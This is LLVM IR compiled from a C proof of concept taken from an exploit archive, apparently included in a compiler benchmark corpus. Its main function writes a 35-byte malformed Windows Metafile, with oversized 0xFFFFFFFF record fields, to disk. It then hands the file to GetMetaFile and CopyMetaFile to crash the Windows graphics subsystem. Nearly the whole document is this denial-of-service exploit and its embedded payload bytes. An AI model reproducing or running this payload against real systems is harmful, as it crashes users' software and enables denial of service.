; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_4337.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_4337.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.main.wmf = private unnamed_addr constant [35 x i8] c"\01\00\09\00\00\03\11\00\00\00\00\00\05\00\00\00\00\00\FF\FF\FF\FF\13\022\00\96\00\03\00\00\00\00\00\00", align 16
@WMF_FILE = common dso_local global i8* null, align 8
@.str = private unnamed_addr constant [2 x i8] c"w\00", align 1
@.str.1 = private unnamed_addr constant [21 x i8] c"File %s write error\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32*, align 8
  %3 = alloca [35 x i8], align 16
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %6 = bitcast [35 x i8]* %3 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %6, i8* align 16 getelementptr inbounds ([35 x i8], [35 x i8]* @__const.main.wmf, i32 0, i32 0), i64 35, i1 false)
  %7 = call i32 (...) @usage()
  %8 = load i8*, i8** @WMF_FILE, align 8
  %9 = call i32* @fopen(i8* %8, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str, i64 0, i64 0))
  store i32* %9, i32** %2, align 8
  %10 = icmp eq i32* %9, null
  br i1 %10, label %11, label %14

11:                                               ; preds = %0
  %12 = load i8*, i8** @WMF_FILE, align 8
  %13 = call i32 @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.1, i64 0, i64 0), i8* %12)
  store i32 0, i32* %1, align 4
  br label %36

14:                                               ; preds = %0
  store i32 0, i32* %4, align 4
  br label %15

15:                                               ; preds = %26, %14
  %16 = load i32, i32* %4, align 4
  %17 = sext i32 %16 to i64
  %18 = icmp ult i64 %17, 34
  br i1 %18, label %19, label %29

19:                                               ; preds = %15
  %20 = load i32, i32* %4, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds [35 x i8], [35 x i8]* %3, i64 0, i64 %21
  %23 = load i8, i8* %22, align 1
  %24 = load i32*, i32** %2, align 8
  %25 = call i32 @fputc(i8 signext %23, i32* %24)
  br label %26

26:                                               ; preds = %19
  %27 = load i32, i32* %4, align 4
  %28 = add nsw i32 %27, 1
  store i32 %28, i32* %4, align 4
  br label %15

29:                                               ; preds = %15
  %30 = load i32*, i32** %2, align 8
  %31 = call i32 @fclose(i32* %30)
  %32 = load i8*, i8** @WMF_FILE, align 8
  %33 = call i32 @GetMetaFile(i8* %32)
  store i32 %33, i32* %5, align 4
  %34 = load i32, i32* %5, align 4
  %35 = call i32 @CopyMetaFile(i32 %34, i32* null)
  store i32 0, i32* %1, align 4
  br label %36

36:                                               ; preds = %29, %11
  %37 = load i32, i32* %1, align 4
  ret i32 %37
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @usage(...) #2

declare dso_local i32* @fopen(i8*, i8*) #2

declare dso_local i32 @printf(i8*, i8*) #2

declare dso_local i32 @fputc(i8 signext, i32*) #2

declare dso_local i32 @fclose(i32*) #2

declare dso_local i32 @GetMetaFile(i8*) #2

declare dso_local i32 @CopyMetaFile(i32, i32*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
